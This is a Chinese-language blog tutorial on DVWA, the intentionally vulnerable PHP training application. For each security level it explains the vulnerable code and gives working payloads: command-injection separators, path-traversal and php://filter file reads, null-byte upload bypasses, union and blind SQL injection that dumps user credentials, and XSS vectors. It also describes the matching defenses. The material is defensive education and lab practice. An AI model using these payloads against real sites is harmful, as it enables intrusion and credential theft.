---
title: DVWA漏洞整理与利用说明
date: 2017-12-13 10:03:27
tags: [渗透测试,代码审计]
categories: 网络安全
---
### DVWA简介
DVWA(Damn Vulnerable Web Application)是一个用来进行安全漏洞验证的PHP/Mysql应用，为专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范过程。

DVWA提供了十个模块，分别为Brute Force(暴力破解)、Command Injection、CSRF、File Inclusion、File Upload、Insecure Captcha(不安全的验证)、SQL Injection、SQL Injection Blind、Xss Reflected、Xss Stored。代码分为四个安全级别：
1. low: 完全没有安全防护
2. medium: 使用了简单的防护，很容易被绕过
3. high:  稍微复杂的防护方案，但任存在漏洞
4. impossible: 使用了安全的防护措施，在当前代码中时绝对安全的。

#### 安装
1. 从[官网](http://open.freebuf.com/)或[Github](https://github.com/ethicalhack3r/DVWA)上下载源码；
2. 解压后修改config/config.inc.php 中的数据库配置、Google Captcha Api配置；
3. 访问http://localhost/dvwa/ 进入安装界面安装数据库，跳转到登录页面登录网站，用户名admin，密码password。

### Brute Force 暴力破解
功能：输入用户名密码进行登录。
```
Low:
    $user = $_GET[ 'username' ];
    $query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
    登录无限制，且参数无过滤直接拼接在sql中，
    1. 可暴力破解，使用BrupSuite Intruder模块即可完成；
    2. 可通过sql注入 $_GET['username']=admin' and 1=0 -- -

Medium:
    参数增加了mysql_real_escape_string()过滤，登录失败时sleep(2)秒，可以暴力破解。

High:
    在medium的基础上增加了Token参数的验证，每个token只能使用一次。
    编写个简单的脚本先获取网页内容->解析token->POST模拟登录接口暴力重试。

Impossible:  
    1. 参数POST的方式传递，并且增加了mysql_real_escape_string过滤，使用PDO方式查询数据库，有效防止sql注入；
    2. 增加user_token，防止csrf，避免工具简单重试；
    3. 用户名增加错误登录次数限制，连续3次错误账号锁定15分钟。
    通过上面的限制完成了暴力破解防护。

PS:
    增加图片验证码效果更好；
    登录失败锁定登录IP方式，可以被绕过，不能完全依赖。
```


### Command Injection  命令行注入
功能：输入ip地址，将ping的结果展示出来
```
Low:
    输入完全无限制，直接坠在ping命令后，可以通过命令连接符执行注入命令。
    command1 && command2   先执行command1后执行command2
    command1 | command2    只执行command2
    command1 & command2   先执行command2后执行command1
    以上三种连接符在windows和linux环境下都支持。

    $_POST['ip'] = 127.0.0.1&&net user

Medium:
    将&&、; 两个字符串过滤掉，  简单过滤可以绕过
    $_POST['ip'] = 127.0.0.1&net user
    $_POST['ip'] = 127.0.0.1&;&net user   //过滤完；整好剩下&&

High:
    过滤了下面的字符，但是[| ]后是有空格的，可以用无空格方式绕过。  
    $substitutions = array(
    	'&'  => '',  ';'  => '','|  ' => '',	 '-'  => '',		
    	'$'  => '', '('  => '',	')'  => '',	'`'  => '',  '||' => '',
    );

Impossible:
    接收的参数强制判断是否为IP：
    先将内容按照[.]分割字符为4部分，每部分进行判断不为数字则报错；    
    最后将4部分通过[.]连接成ip地址，避免了ip参数处注入其它命令。

PS:
    使用白名单方式，对用户的输入进行严格的校验，或格式转换，只执行想要的命令。
    medium及high模式中 字符串替换，属于黑名单方式，是不安全的。
```

### CSRF跨站请求伪造
功能：输入两次新密码，及修改当前登录用户的密码。
漏洞说明：
    构造重置密码的链接，引导管理员访问。但是浏览器有同源策略，不能访问其他域的Cookie，这种情况下需要与网站Xss漏洞结合使用。
```
Low:
    接收两个GET参数，将密码拼接在Url后，引导用户访问即可，无同源策略限制。引导方法：
    A.发邮件、转短连接隐藏地址，但是会进入修改成功的提示页，用户会有所察觉；
    B.构造攻击页面，插入<img src='改密url'/>标签, 用户访问时，浏览器加载图片时自动修改密码。

Medium：
    同上，只是增加了HTTP_REFERER的限制，无同源限制。
    在构造的链接上缀上参数即可：  abc.com/test.html?hello=[SERVER_NAME~balabala]

High:
    增加了Token的限制，使用session中的token进行回话验证。
    需要获取Token后才能模拟请求，登录后才能访问该页面获取token，但是浏览器有同源策略限制。
    在同源策略下abc.com域名的网页无法访问localhost的cookie，也就无法获取到页面的token。
    需要配合xss漏洞，在xss页面注入js实现改密操作。

Impossible:
    使用Token验证，并增加了旧密码的验证。
    不知道旧密码则无法修改，彻底防御了csrf；使用token+同源策略防止了暴力重试。
```

### File Inclusion  文件包含漏洞
**漏洞说明：**  
php中使用require、include包含文件，只要文件内容符合php的语法就可以被执行，任何文件后缀都可以；不符合语法时则直接输出。
当开启了allow_url_fopen时将可以包含远程文件，可以构造任意远程代码，在该服务器执行。

```
Low:
    文件名直接从GET[page]参数中获取，可以直接改为任意文件  
    1. 直接执行远程php代码：
    /vulnerabilities/fi/？page=http://localhost/safe/sample_vulnerable_code/phpinfo.txt
    2. base64_decode的方式读取文件内容，并展示在页面
    vulnerabilities/fi/?page=php://filter/read=convert.base64-encode/resource=../..   /config/config.inc.php

Medium:  
    对参数进行了简单的过滤
    $file = str_replace( array( "http://", "https://" ), "", $file );
    $file = str_replace( array( "../", "..\"" ), "", $file );

    hthttps://tp:// 过滤后，刚好为http:// 绕过该防护，过滤太简单。

High:
    程序主要功能是引用 file1.php file2.php file3.php include.php, 所以代码中增加了文件名的校验。
    if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
        //   验证文件为include.php 或者文件名为 file开头。
        echo "ERROR: File not found!";
        exit;
    }
    利用file协议即可绕过该正则判断： vulnerabilities/fi/?page=file:///C:/Windows.ini

Impossible:
    High级别的策略是对的，但是正则写的不够严谨。在代码中使用白名单，文件名称全匹配，避免了引入其他未知文件.

PS：
    在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，我们可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别。
    或者使用超长文件名，让程序自动截断文件名，不分php版本。

```

### File Upload   文件上传
**漏洞说明：**
对上传文件没有限制，导致用户上传了可执行的代码文件。
在拿到网站后台后，会优先寻找上传漏洞，上传小马进而获取服务器webshell权限。
```
Low :
    没有任何防护，文件没用重命名，可直接上传php。

Medium:  
    1. 上传.php文件报错如下：
        Error:  Your image was not uploaded. We can only accept JPEG or PNG images.
    2. 修改Content-Type: image/png，成功上传了phpinfo.php文件。

    源码：
        $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ];
        if( ( $uploaded_type == "image/jpeg" || $uploaded_type == "image/png" ) &&
        只判断了header头中的content-type，通过抓包工具修改header头即可。

High:
    源码增加了文件名后缀的判断，但文件未重命名。
    上传 test.php%00.png，在文件开始增加png头[89 50 4E 47 0D 0A 1A 0A]，
    在php<5.3.4 && Magic_quote_gpc=off时，通过substr获取的后缀为png，在保存文件时%00会截断为test.php

    %00的增加方式：
        1. 使用burpsuite抓包，在Row模式下文件名中间增加空格，然后切换到hex编码，找到20改成00.
        2. 或者在Row模式下在文件名中增加%00，然后对[%00] 右键进行url decode编码。

Impossible:
    文件名、content-type 都增加了白名单校验；
    文件名重命名避免了%00截断漏洞；
    使用的Token避免了Csrf，和工具暴力重试，增加了重试难度。

PS:
    安全的文件上传策略： 白名单+文件重命名。
```

### Insecure Captcha  不安全的验证逻辑
功能：修改密码使用了验证码进行安全性校验，但是存在逻辑漏洞。
```
Low:
    使用两步修改密码，第一步验证通过后进入第二步进行确认。
    两步之间没有关联性，可直接模拟第二步，抓包后修改step=2，即可直接修改密码。

Medium:
    还是两步逻辑，第一步验证通过后在第二步的页面增加了passed_captcha=true标签。
    两步之间没有校验，抓包后修改step=2、passed_captcha=true, 即可直接请求第二步，修改密码。

High:
    使用一步完成校验与密码修改，但是存在特殊判断如果验证码校验
  	if( !$resp->is_valid && ( $_POST[ 'recaptcha_response_field' ] != 'hidd3n_valu3' || $_SERVER[ 'HTTP_USER_AGENT' ] != 'reCAPTCHA' ) ) {
		// What happens when the CAPTCHA was entered incorrectly
		$html     .= "<pre><br />The CAPTCHA was incorrect. Please try again.</pre>";
		$hide_form = false;
		return;
	}
    抓包增加recaptcha_response_field=hidd3n_valu3参数，并修改user-agent=reCAPTCHA，在验证码错误时仍能执行后面的代码，成功修改密码。

Impossible:
    增加token验证、去掉绕过验证的特殊代码、在修改密码前先验证旧密码，使用PDO查询数据库，一步完成验证和密码修改，避免了验证绕过的逻辑漏洞。

PS:
    找回密码业务必须要注意：
        1. 凭证是否安全、是否可以伪造凭证;
        2. 分步操作时，最有一步是否可以修改的用户ID、用户名等信息,修改任意用户的密码;
        3. 使用短信验证码时，短信验证码是否可以限制，4位验证码只需重试9999次；
        4. 等等...
    商城常见逻辑漏洞和测试方法：
        1. 兑换物品个数使用负数 -1；
        2. 兑换使用的积分或金额，抓包后随意修改，从1000改为1；
        3. 兑换使用的红包Id,随意填写，使用他人的红包；
        4. 等等...
```

### SQL Injection   sql注入漏洞
```
Low:
    参数直接拼接在sql语句中，可以注入任意sql；在语法错误时有sql报错，更加方便于的编写注入sql。
    $_GET['id']= 1' or 1=1 -- -   //即可绕过判断，利用union查询数据库内容稍后详解

Medium:
    参数增加了mysql_real_escape_string过滤，然后直接拼接的sql中(没有单引号包含).
    上述方法只转义特殊字符：[\ \00 \n ' " \x0a], sql中没有单引号所以我们也不需要输入'进行闭合，注入合法sql即可。
    $_GET['id']=1 or 1=1

High:
    从Session中获取id，理论上很安全；但是session可以通过前端随意修改，和Low级别一样不安全。

Impossible:
    int型参数增加is_numeric判断，不接受其他字符串，避免了sql注入。并使用PDO绑定参数的方式查询数据库，十分安全。

PS:
    1. 数据库查询推荐使用PDO方式，$变量完全不出现在sql中；
    2. 参数要增加严格校验，及格式转换，只接受自己想要的参数；
    3. 不要相信任何的用户输入、SERVER变量、数据库查询出来的数据等；
    4. 等等...

```

**SQL手动注入方法简要说明：**
```
利用上面的漏洞，对sql手动注入简单记录一下, Low模式下：
1. 通过 id=1 和 id=1' 的展示不同判断是否存在漏洞；
2. 通过 id=1' and 1=1 -- - 和 id=1' and 1=0 -- - , 确认sql注入点[ and 1=0 ]出可以随意修改；
3. 通过order by 确认前面查询字段数。 id=1' order by [n] -- -，当n=3时报错，n=2时正常，说明共两个字段；
4. 先将前面的查询置为空，在通过union确定回显字段。 id=1' and 1=0 union select 1,2 -- - , 确定回显字段为1，2
5. 在union后构造查询语句，即可获取数据库信息，常用的有：
    //获取数据用户、数据库名
    union select concat(user(), @@version, database()), 2     
    //获取表名，users
    union select (select table_name from information_schema.TABLES where table_schema='dvwa' limit 1,1),2  
    //获取字段名  
    union select (select column_name from information_schema.columns where table_name='users' and table_schema='dvwa' limit 0,1),2   
    //获取表数据
    union select (select cancat(user,0x3a,password) from user limit 0,1),2  
    通过limit n,1逐条获取，或通过group_concat组联合查询查询多条数据。
```


### SQL Injection Blind   sql盲种
```
四个安全级别代码同上，漏洞也一样。只是没有内容回显，只有id是否存在的返回，不同通过union进行查询，修改修改注入手法。
```
**SQL盲种方法**
```
主要函数：length、 ascii、substr
1. 通过 id=1 和 id=1' 的展示不同判断是否存在漏洞；
2. 通过 id=1' and 1=1 -- - 和 id=1' and 1=0 -- - , 确认sql注入点[ and 1=0];
3. 通过暴力猜测，判断数据库名：
    1' and length(database())=[1-100] -- -           //获取数据库名长度为4
    1' and ascii(SELECT SUBSTR(database(),1,1)=[97-255] -- -  //通过是否相等获取字符的Ascii码，依次修改[1-4,1] 获取所有ascii码，最终获取数据名
    获取表名、字段名等同上。
```


### XSS Reflected 反射型跨站脚本
```
Low：
    用户参数直接显示在页面上，存在反射xss漏洞
    $html .= '<pre>Hello ' . $_GET[ 'name' ] . '</pre>';
    输入<script>alert(1);</script>，在F12-console中会有XSS拦截的反馈:
    The XSS Auditor blocked access to  'URL' because the source code of a script was found within the request.
    The auditor was enabled as the server did not send an 'X-XSS-Protection' header.

Medium：
    过滤了<script>标签，但是可以通过<img>、<ScrIpt>大小写区分 标签绕过去。
    <img src='1' onerror='alert(1)' />

High:
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
    使用img标签绕过防护：<img src='1' onerror='alert(1)' />

Impossible:  
    使用 htmlspecialchars()将特色字符转换为实体字符，
    默认不转义单引号'，只转义双引号". 需要使用额外的参数进行指明。

PS:
    只增加转义在该代码处安全，但不是万能的。如果内容被包含在标签了，可直接配合单引号[']，绕过该过滤。
        代码： $html = <iuput type='text' name='.$name.' />
    利用javascript伪协议可以利用漏洞：
        POST:  $_POST['name'] = aaaa' onclick='alert(1)'
    onclick, onmouseover 等都是可以的.  所以建议增加ENT_QUOTES，将' " 都转义。

```

### XSS Store   存储型跨站脚本
```
四个安全漏洞同上。将Xss内容保存到数据库中了，所有人访问都会出现该漏洞。
建议不要用alert()，而使用console.log()进行注入调试。

```

**相关阅读**
[新手指南：DVWA-1.9全级别详细教程](http://www.freebuf.com/author/lonehand)


@2017-12-04
